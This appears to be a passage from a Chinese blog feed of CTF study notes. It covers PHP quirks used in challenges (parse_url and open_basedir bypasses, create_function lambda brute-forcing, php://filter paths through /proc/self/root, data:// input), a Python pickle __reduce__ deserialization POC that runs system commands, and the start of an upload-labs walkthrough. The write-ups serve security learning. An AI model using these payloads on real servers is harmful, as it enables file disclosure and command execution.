title="PHP数组溢出"></a>PHP数组溢出</h2><blockquote><p>php5.5.9nts  </p></blockquote><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$array</span><span class="token punctuation">[</span><span class="token variable">$c</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$array</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token double-quoted-string string">"nono"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token double-quoted-string string">"flag"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">//echo PHP_INT_MAX;</span><span class="token delimiter important">?></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/lll-nnn/picture/picgo/202204172354689.png"></p><blockquote><p>php7.3.4.nts</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/lll-nnn/picture/picgo/202204172354954.png"></p><h2 id="parse-url-解析漏洞"><a href="#parse-url-解析漏洞" class="headerlink" title="parse_url()解析漏洞"></a><code>parse_url()</code>解析漏洞</h2><ul><li><p><code>function.php</code>中</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">filter_directory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$keywords</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token double-quoted-string string">"flag"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"manage"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"ffffllllaaaaggg"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$uri</span> <span class="token operator">=</span> <span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"REQUEST_URI"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">parse_str</span><span class="token punctuation">(</span><span class="token variable">$uri</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'query'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//    var_dump($query);</span><span class="token comment">//    die();</span>    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$keywords</span> <span class="token keyword">as</span> <span class="token variable">$token</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$query</span> <span class="token keyword">as</span> <span class="token variable">$k</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$v</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$k</span><span class="token punctuation">,</span> <span class="token variable">$token</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token function">hacker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$v</span><span class="token punctuation">,</span> <span class="token variable">$token</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token function">hacker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p><code>http://675a4ec5-c964-4b92-a667-7415df780f0f.node4.buuoj.cn/user.php?page=php://filter/convert.base64-encode/resource=ffffllllaaaaggg</code></p><p>这样就会被匹配到，不能读取；但是如果这样<code>///user.php?page=php://filter/convert.base64-encode/resource=ffffllllaaaaggg</code>parse_url就会返回<code>false</code>；读取成功。</p><p><img src="https://cdn.jsdelivr.net/gh/lll-nnn/picture/picgo/202204172354816.png"></p><p><strong>漏洞问题只存在于php5.4.7以前</strong></p></li></ul><h2 id="create-function"><a href="#create-function" class="headerlink" title="create_function()"></a>create_function()</h2><pre class="language-php" data-language="php"><code class="language-php">create_function <span class="token punctuation">(</span> string <span class="token variable">$args</span> <span class="token punctuation">,</span> string <span class="token variable">$code</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> string</code></pre><p>这个函数生成的匿名函数命名为：<code>%00lambda_%d</code>,<code>%d</code>为数字，从<code>1</code>开始不断递增，刷新一次递增<code>1</code>.</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$newfunc</span> <span class="token operator">=</span> <span class="token function">create_function</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'$a,$b'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'return "ln($a) + ln($b) = " . log($a * $b);'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"New anonymous function: <span class="token interpolation"><span class="token variable">$newfunc</span></span>\n"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$newfunc</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token constant">M_E</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token double-quoted-string string">"\n"</span><span class="token punctuation">;</span><span class="token comment">// outputs</span><span class="token comment">// New anonymous function: lambda_1</span><span class="token comment">// ln(2) + ln(2.718281828459) = 1.6931471805599</span><span class="token delimiter important">?></span></span></code></pre><ul><li><p>题</p><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$MY</span> <span class="token operator">=</span> <span class="token function">create_function</span><span class="token punctuation">(</span><span class="token double-quoted-string string">""</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"die(`cat flag.php`);"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$hash</span> <span class="token operator">=</span> <span class="token function">bin2hex</span><span class="token punctuation">(</span><span class="token function">openssl_random_pseudo_bytes</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"function SUCTF_<span class="token interpolation"><span class="token variable">$hash</span></span>()&#123;"</span>    <span class="token punctuation">.</span><span class="token double-quoted-string string">"global \$MY;"</span>    <span class="token punctuation">.</span><span class="token double-quoted-string string">"\$MY();"</span>    <span class="token punctuation">.</span><span class="token double-quoted-string string">"&#125;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'func_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"func_name"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </span></code></pre><p>payload:</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> timeurl<span class="token operator">=</span><span class="token string">'http://6ed29293-29df-45d5-b2d4-2192723dda4d.node4.buuoj.cn:81/?func_name=%00lambda_1'</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.5</span><span class="token punctuation">)</span>    r<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">)</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string">'flag'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>        <span class="token keyword">break</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'nono'</span><span class="token punctuation">)</span></code></pre></li></ul><h2 id="base-convert"><a href="#base-convert" class="headerlink" title="base_convert()"></a>base_convert()</h2><p><img src="https://cdn.jsdelivr.net/gh/lll-nnn/picture/picgo/202204172354398.png"></p><blockquote><p>36进制</p><p>0-9  A-Z</p></blockquote><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">echo</span> <span class="token function">base_convert</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'hex2bin'</span><span class="token punctuation">,</span><span class="token number">36</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"\n"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">base_convert</span><span class="token punctuation">(</span><span class="token number">37907361743</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">36</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//37907361743</span><span class="token comment">//hex2bin</span>以此绕过过滤的函数</span></code></pre><h2 id="proc-self-root"><a href="#proc-self-root" class="headerlink" title="/proc/self/root/"></a>/proc/self/root/</h2><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">require_once</span> <span class="token single-quoted-string string">'flag.php'</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">require_once</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><blockquote><p><code>/proc/self</code>指向当前进程的<code>/proc/pid/</code>，<code>/proc/self/root/</code>是指向/的符号链接，想到这里，用<code>伪协议配合多级符号链接</code>的办法进行绕过。</p></blockquote><p>payload:</p><blockquote><p>?file=php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php</p></blockquote><p>另一个payload：</p><blockquote><p>?file=php://filter/convert.base64-encode/resource=/nice/../../proc/self/cwd/flag.php</p></blockquote><h2 id="绕过open-basedir"><a href="#绕过open-basedir" class="headerlink" title="绕过open_basedir"></a>绕过open_basedir</h2><pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>backdoor<span class="token operator">=</span><span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'Von'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'Von'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'open_basedir'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'open_basedir'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">scandir</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h2 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents()"></a>file_get_contents()</h2><p><img src="https://cdn.jsdelivr.net/gh/lll-nnn/picture/picgo/202204172355718.png"></p><p>手册中还有个这样的例子：</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$homepage</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'http://www.example.com/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$homepage</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>说明<code>file_get_contents()</code>是可以解析<code>HTTP</code>的</p><p>所以可以利用<code>伪协议</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$text</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$text</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'r'</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token double-quoted-string string">"welcome to the zjctf"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>这样的便可传入    text<span class="token operator">=</span>data<span class="token punctuation">:</span><span class="token comment">//text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=</span><span class="token comment">// d2VsY29tZSB0byB0aGUgempjdGY= 解码后为 ----->  welcome to the zjctf</span>——————————————————————————或者 php<span class="token punctuation">:</span><span class="token comment">//input</span>post<span class="token punctuation">:</span> welcome to the zjctf</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;php特性&quot;&gt;&lt;a href=&quot;#php特性&quot; class=&quot;headerlink&quot; title=&quot;php特性&quot;&gt;&lt;/a&gt;php特性&lt;/h1&gt;&lt;h2 id=&quot;intval&quot;&gt;&lt;a href=&quot;#intval&quot; class=&quot;headerlink&quot; title=&quot;i</summary>
      
    
    
    
    <category term="笔记" scheme="http://lll-nnn.github.io/categories/%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="php特性" scheme="http://lll-nnn.github.io/tags/php%E7%89%B9%E6%80%A7/"/>
    
  </entry>
  
  <entry>
    <title>Python反序列化</title>
    <link href="http://lll-nnn.github.io/2022/04/17/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>http://lll-nnn.github.io/2022/04/17/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2022-04-17T15:45:52.000Z</published>
    <updated>2022-04-17T15:57:24.534Z</updated>
    
    <content type="html"><![CDATA[<h2 id="python反序列化"><a href="#python反序列化" class="headerlink" title="python反序列化"></a>python反序列化</h2><h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><blockquote><p>python 中的pickle模块中的一些函数可以对数据序列化和反序列化</p></blockquote><table><thead><tr><th>函数</th><th>说明</th></tr></thead><tbody><tr><td>dumps</td><td>对象反序列化为bytes对象</td></tr><tr><td>dump</td><td>对象反序列化到文件对象，存入文件</td></tr><tr><td>loads</td><td>从bytes对象反序列化</td></tr><tr><td>load</td><td>对象反序列化，从文件中读取数据</td></tr></tbody></table><ul><li><p><code>pickle.dump</code>(<em>obj</em>, <em>file</em>, <em>protocol=None</em>, ***, <em>fix_imports=True</em>, <em>buffer_callback=None</em>)</p><p><code>obj</code>——-&gt;对象</p><p><code>file</code>——&gt;存入的文件，后缀名为<code>.pkl</code>,必须以二进制可写模式打开<code>wb</code></p><p><code>protocol</code>——–&gt;是pickle的版本，目前<code>Python 3.9.1</code>,范围为0到最高<code>pickle.HIGHEST_PROTOCOL</code>为5，默认的<code>DEFAULT_PROTOCOL</code>为4，指定一个负数就相当于指定 <code>HIGHEST_PROTOCOL</code>。</p><p><code>Pickler(file, protocol).dump(obj)</code> 实现的功能跟 <code>pickle.dump() </code>是一样的。</p><p><img src="https://cdn.jsdelivr.net/gh/lll-nnn/picture/picgo/202204172356616.png"></p></li><li><p><code>pickle.dumps</code>(<em>obj</em>, <em>protocol=None</em>, ***, <em>fix_imports=True</em>, <em>buffer_callback=None</em>)</p><p>dumps与dump的区别就是dumps不需要写入到文件中，直接返回<code>bytes</code>对象</p></li><li><p><code>pickle.load</code>(<em>file</em>, ***, <em>fix_imports=True</em>, <em>encoding=”ASCII”</em>, <em>errors=”strict”</em>, <em>buffers=None</em>)</p><p><code>file</code>——–&gt;以二进制读取<code>rb</code></p></li><li><p><code>pickle.loads</code>(<em>bytes_object</em>, ***, <em>fix_imports=True</em>, <em>encoding=”ASCII”</em>, <em>errors=”strict”</em>, <em>buffers=None</em>)</p></li></ul><pre class="language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">import</span> pickle<span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">import</span> os<span class="token operator">>></span><span class="token operator">></span> pickle<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token number">123</span><span class="token punctuation">,</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'123.pkl'</span><span class="token punctuation">,</span><span class="token string">'wb'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> pickle<span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'123.pkl'</span><span class="token punctuation">,</span><span class="token string">'rb'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token number">123</span><span class="token operator">>></span><span class="token operator">></span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token string">b'\x80\x04K&#123;.'</span><span class="token operator">>></span><span class="token operator">></span> pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span><span class="token string">b'\x80\x04K&#123;.'</span><span class="token punctuation">)</span><span class="token number">123</span></code></pre><p>可以序列化的对象</p><p><img src="https://cdn.jsdelivr.net/gh/lll-nnn/picture/picgo/202204172356222.png"></p><h3 id="pickle反序列化漏洞"><a href="#pickle反序列化漏洞" class="headerlink" title="pickle反序列化漏洞"></a>pickle反序列化漏洞</h3><p>造成python反序列化漏洞的主要原因是<code>__reduce()__</code>魔法函数，它会在反序列化结束的时候调用。</p><p>另外<code>pickle.loads</code>会解决<code>import</code>问题，对于未引入的<code>module</code>会自动尝试<code>import</code>。那么也就是说整个python标准库的代码执行、命令执行函数都可以进行使用。</p><blockquote><p><code>object.__reduce__</code>()</p><p><img src="https://cdn.jsdelivr.net/gh/lll-nnn/picture/picgo/202204172356449.png"></p></blockquote><p>该函数需要返回一个元组，第一个参数为可调用对象，第二个是可调用对象的参数</p><blockquote><p>在python2中只有内置类才有<code>__reduce__</code>方法，即用<code>class A(object)</code>声明的类，而<code>python3</code>中已经默认都是内置类了</p></blockquote><p><code>POC</code></p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pickle<span class="token keyword">import</span> os<span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        cmd <span class="token operator">=</span> <span class="token string">"whoami"</span>         <span class="token keyword">return</span> <span class="token punctuation">(</span>os<span class="token punctuation">.</span>system<span class="token punctuation">,</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    test <span class="token operator">=</span> A<span class="token punctuation">(</span><span class="token punctuation">)</span>    result1 <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>test<span class="token punctuation">)</span>    result2 <span class="token operator">=</span> pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>result1<span class="token punctuation">)</span>    ➜ python <span class="token number">4.</span>pylaptop<span class="token operator">-</span>rhthcab2\l<span class="token operator">-</span><span class="token operator">-</span>n</code></pre><blockquote><p>#os.system和os.popen<br><code>os.system</code> 调用系统命令，完成后退出，返回结果是命令执行状态，一般是0<br><code>os.popen()</code> 无法读取程序执行的返回值</p><p>这两个以<code>print</code>才能输出结果，如果是以<code>return</code>返回的就不会显示结果。</p><p><code>commands.getoutput()</code>这个函数来进行代替</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">payload</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>     <span class="token keyword">return</span> <span class="token punctuation">(</span>commands<span class="token punctuation">.</span>getoutput<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token string">'ls /'</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre></blockquote><p>more:</p><p><code>PVM</code>、<code>详解</code>、<code>opcode</code></p><p>(<a href="https://xz.aliyun.com/t/7436#toc-9">https://xz.aliyun.com/t/7436#toc-9</a>)</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;python反序列化&quot;&gt;&lt;a href=&quot;#python反序列化&quot; class=&quot;headerlink&quot; title=&quot;python反序列化&quot;&gt;&lt;/a&gt;python反序列化&lt;/h2&gt;&lt;h3 id=&quot;基础知识&quot;&gt;&lt;a href=&quot;#基础知识&quot; class=&quot;head</summary>
      
    
    
    
    <category term="笔记" scheme="http://lll-nnn.github.io/categories/%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="python反序列化" scheme="http://lll-nnn.github.io/tags/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>Uploadlibs</title>
    <link href="http://lll-nnn.github.io/2022/04/17/uploadlibs/"/>
    <id>http://lll-nnn.github.io/2022/04/17/uploadlibs/</id>
    <published>2022-04-17T15:45:18.000Z</published>
    <updated>2022-04-17T15:58:02.932Z</updated>
    
    <content type="html"><![CDATA[<h2 id="upload-labs"><a href="#upload-labs" class="headerlink" title="upload-labs"></a>upload-labs</h2><p><img src="https://cdn.jsdelivr.net/gh/lll-nnn/picture/picgo/202204172348012.png"></p><p><img src="https://cdn.jsdelivr.net/gh/lll-nnn/picture/picgo/202204172349143.png"></p><h3 id="Pass-01"><a href="#Pass-01" class="headerlink" title="Pass-01"></a>Pass-01</h3><p>前端验证</p><pre class="language-js" data-language="js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">checkFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> file <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementsByName</span><span class="token punctuation">(</span><span class="token string">'upload_file'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>value<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>file <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> file <span class="token operator">==</span> <span class="token string">""</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"请选择要上传的文件!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">//定义允许上传的文件类型</span>    <span class="token keyword">var</span> allow_ext <span class="token operator">=</span> <span class="token string">".jpg|.png|.gif"</span><span class="token punctuation">;</span>    <span class="token comment">//提取上传文件的类型</span>    <span class="token keyword">var</span> ext_name <span class="token operator">=</span> file<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>file<span class="token punctuation">.</span><span class="token function">lastIndexOf</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//判断上传文件类型是否允许上传</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>allow_ext<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span>ext_name<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">var</span> errMsg <span class="token operator">=</span> <span class="token string">"该文件不允许上传，请上传"</span> <span class="token operator">+</span> allow_ext <span class="token operator">+</span> <span class="token string">"类型的文件,当前文件类型为："</span> <span class="token operator">+</span> ext_name<span class="token punctuation">;</span>        <span class="token function">alert</span><span class="token punctuation">(</span>errMsg<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>抓包改后缀即可</p><h3 id="Pass-02"><a href="#Pass-02" class="headerlink" title="Pass-02"></a>Pass-02</h3><p><code>源码</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token constant">UPLOAD_PATH</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'type'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token single-quoted-string string">'image/jpeg'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'type'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token single-quoted-string string">'image/png'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'type'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token single-quoted-string string">'image/gif'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">//检查MIME</span>            <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//文件名</span>            <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">'/'</span> <span class="token punctuation">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'name'</span><span class="token punctuation">]</span>                        <span class="token keyword">if</span> <span class="token 